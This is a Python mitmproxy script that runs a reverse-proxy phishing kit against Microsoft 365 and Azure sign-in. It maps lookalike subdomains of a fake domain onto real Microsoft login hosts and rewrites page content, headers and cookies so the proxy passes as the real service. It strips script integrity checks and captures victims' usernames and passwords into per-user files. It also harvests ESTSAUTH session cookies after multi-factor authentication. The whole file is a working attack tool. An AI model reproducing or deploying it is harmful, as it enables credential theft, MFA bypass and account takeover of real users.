from mitmproxy import http
import re
import copy
from urllib.parse import parse_qs
import os

# Fake domain
fake_domain = "omri-ambev.com"
lure_url = "/updater"

permissions_scope = r"scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&"
redirect_uri = r"redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&"

# Full domain mapping for all relevant Azure and Office 365 domains - we can change the names as we want
domain_mapping = {
    f"sso.{fake_domain}": "login.microsoftonline.com",
    #f"autologon.microsoftazuread-sso.{fake_domain}": "autologon.microsoftazuread-sso.com",
    f"live.{fake_domain}": "login.live.com",
    f"windows.{fake_domain}": "login.windows.net",
    f"sts.{fake_domain}": "sts.windows.net",
    f"graph.{fake_domain}": "graph.windows.net",
    f"office365.{fake_domain}": "outlook.office365.com",
    #f"office.{fake_domain}": "office.com",
    f"office.{fake_domain}": "www.office.com",
    f"portal.{fake_domain}": "portal.office.com",
    f"myapps.{fake_domain}": "myapps.microsoft.com",
    f"login.{fake_domain}": "login.microsoft.com",
    f"msftauth.{fake_domain}": "msftauth.net",
    f"msidentity.{fake_domain}": "msidentity.com",
    f"msauth.{fake_domain}": "msauth.net",
    f"sharepoint.{fake_domain}": "sharepoint.com",
    f"office365.{fake_domain}": "office365.com",
    f"aka.{fake_domain}": "aka.ms",
    f"mfa-microsoft.{fake_domain}": "mfa.microsoft.com"
}


# This will print the content of a file we can upload to cloud flare to set up the domains
to_change = """%s       1       IN      CNAME   %s.""" 
print(";; CNAME Records")
for fake_domain_generated, real_doamin in domain_mapping.items():
    #print(to_change % (fake_domain_generated.split(".")[0], fake_domain))
    print("192.168.32.1", fake_domain_generated)

regex_rules = {
    "login.microsoftonline.com": r"(login\.microsoftonline\.com)",
    "login.live.com": r"(login\.live\.com)",
    "login.windows.net": r"(login\.windows\.net)",
    "sts.windows.net": r"(sts\.windows\.net)",
    "graph.windows.net": r"(graph\.windows\.net)",
    "outlook.office365.com": r"(outlook\.office365\.com)",
    #"office.com": r"(office\.com)",
    "www.office.com": r"(www\.office\.com)",
    "portal.office.com": r"(portal\.office\.com)",
    "myapps.microsoft.com": r"(myapps\.microsoft\.com)",
    "login.microsoft.com": r"(login\.microsoft\.com)",
    "msftauth.net": r"(?<!aadcdn\.)msftauth\.net",  # Exclude aadcdn.msftauth.net
    "msidentity.com": r"(msidentity\.com)",
    "msauth.net": r"(?<!aadcdn\.)msauth\.net",  # Exclude aadcdn.msauth.net
    "sharepoint.com": r"(sharepoint\.com)",
    "office365.com": r"(office365\.com)",
    "aka.ms": r"(aka\.ms)",
    "mfa.microsoft.com": r"(mfa\.microsoft\.com)",
    #"autologon.microsoftazuread-sso.com": r"(autologon\.microsoftazuread\-sso\.com)"
}


def replace_in_html(html_bytes: bytes) -> bytes:
    """Replace domains in the HTML content."""
    html = html_bytes.decode('utf-8', errors='ignore')  # Decode HTML as UTF-8

    for fake_domain, real_domain in domain_mapping.items():
        html = re.sub(regex_rules[real_domain], fake_domain, html)
    
    html = re.sub(r'<script[^>]*\sintegrity="[^"]+"[^>]*>', lambda match: re.sub(r'\sintegrity="[^"]+"', '', match.group()), html)
    look_for_scope_variable = r"(?:scope=)(.*?)(?:\&)"
    html = re.sub(look_for_scope_variable, permissions_scope, html)       

    return html.encode('utf-8')  # Re-encode to bytes


def set_headers_for_response(headers: http.Headers, BOOL=0) -> http.Headers:
    """Replace domains in response headers, handling Set-Cookie specifically."""
    
    # Create a deepcopy of the mitmproxy headers object
    updated_headers = copy.deepcopy(headers)
    
    for header_name, header_value in headers.items():
        if header_name.lower() != "set-cookie":
            for fake_domain, real_domain in domain_mapping.items():
                header_value = re.sub(regex_rules[real_domain], fake_domain, header_value)
                # Modify the scope variable if it exists
                look_for_scope_variable = r"(?:scope=)(.*?)(?:\&)"
                redirect_regex = r"(?:redirect_uri=)(.*?)(?:\&)"
                header_value = re.sub(look_for_scope_variable, permissions_scope, header_value)
                header_value = re.sub(redirect_regex, redirect_uri, header_value)
            
            # Update non 'Set-Cookie' headers
            updated_headers[header_name] = header_value
    
    # Handle 'Set-Cookie' header separately
    for header_name in headers.keys():
        if header_name.lower() == "set-cookie":
            # Get all 'Set-Cookie' values
            header_values = headers.get_all(header_name)
            updated_headers.pop(header_name, None)  # Remove original 'Set-Cookie' to avoid duplication
            for set_cookie in header_values:
                for fake_domain, real_domain in domain_mapping.items():
                    # Replace the domain in the 'Set-Cookie' header value
                    set_cookie = re.sub(regex_rules[real_domain], fake_domain, set_cookie)
                # Add the modified 'Set-Cookie' back to the headers
                updated_headers.add(header_name, set_cookie)

    return updated_headers


def request(flow: http.HTTPFlow) -> None:
    """Handle incoming requests by rewriting URLs."""
    host_header = flow.request.host_header
    if host_header in domain_mapping:
        # Replace the host in the URL with the mapped domain
        flow.request.url = flow.request.url.replace(host_header, domain_mapping[host_header])
    
            
def response(flow: http.HTTPFlow) -> None:
    """Modify the responses by adjusting headers and content."""
    response = flow.response

    # Deep copy headers (convert to dict first)
    headers_copy = copy.deepcopy(response.headers)

    # Modify headersp
    # https://login.microsoftonline.micr-amebv.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.micr-amebv.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.micr-amebv.com%2Fv2%2FOfficeHome.All

    modified_headers = set_headers_for_response(headers_copy)
    response.headers.clear()
    response.headers = modified_headers

    # custom_html = """
    # <div style="background-color:#f0f0f0;padding:10px;border-bottom:1px solid #ddd;text-align:center;">
    #     <p>DocuSign re-directing to SSO login</p>
    # </div>
    # """

    # # Only inject HTML if the content type is text/html
    # if "text/html" in response.headers.get("Content-Type", "").lower():
    #     response.content = replace_in_html(response.content)
        
    #     # Insert the custom HTML snippet at the beginning of the body
    #     response_html = response.content.decode('utf-8', errors='ignore')
    #     response_html = custom_html + response_html
    #     response.content = response_html.encode('utf-8') 


    if flow.request.path.lower() == "/common/login".lower():
        post_data = flow.request.content.decode()
        # Parse the URL-encoded POST data
        parsed_data = parse_qs(post_data)
        # Extract the 'login' parameter
        if 'login' in parsed_data:
            try:
                login_value = parsed_data['login'][0]
            except Exception:
                login_value = "Unknown_user"

            passwd_value = parsed_data['passwd'][0]
            file_path = login_value + ".txt"

            # Check if file exists
            WRITE_DATA = f"""
--------------------------------------------
{login_value} : {passwd_value}

--------------------------------------------
\n"""
            if not os.path.exists(file_path):
                # Create the file
                with open(file_path, 'w+') as f:
                    f.write(WRITE_DATA)
            else:
                with open(file_path, 'a+') as f:
                    f.write(WRITE_DATA)                


            print(f"Extracted login: {login_value} : {passwd_value}")          


    if flow.request.path.lower() == "/common/SAS/ProcessAuth".lower():
        COOKIES_FINAL = ""
        for COOKIE in response.headers.get_all("Set-Cookie"):
            if "ESTSAUTH" in COOKIE:
                print("FOUND LOGIN COOKIE")
                print(COOKIE)

                COOKIES_FINAL += "\n" + COOKIE


        post_data = flow.request.content.decode()
        parsed_data = parse_qs(post_data)
        try:
            login_value = parsed_data['login'][0]
        except Exception:
            login_value = "Unknown_user"

        file_path = login_value + ".txt"

        WRITE_DATA = f"""
--------------------------------------------
{login_value} : {COOKIES_FINAL}

--------------------------------------------
\n"""
        
        # LoginOptions=1 set it in /kmsi request
        if not os.path.exists(file_path):
            # Create the file
            with open(file_path, 'w+') as f:
                f.write(WRITE_DATA)
        else:
            with open(file_path, 'a+') as f:
                f.write(WRITE_DATA)               

    
    if flow.request.path.lower() == "/landingv2".lower():
            response.headers.clear()
            response.headers.add("Location", "https://www.office.com/landingv2")


    response.content = replace_in_html(response.content)

# Running mitmproxy
if __name__ == "__main__":
    from mitmproxy.tools.main import mitmweb
    mitmweb(['-s', __file__, '--listen-port', '443', '--ssl-insecure'])
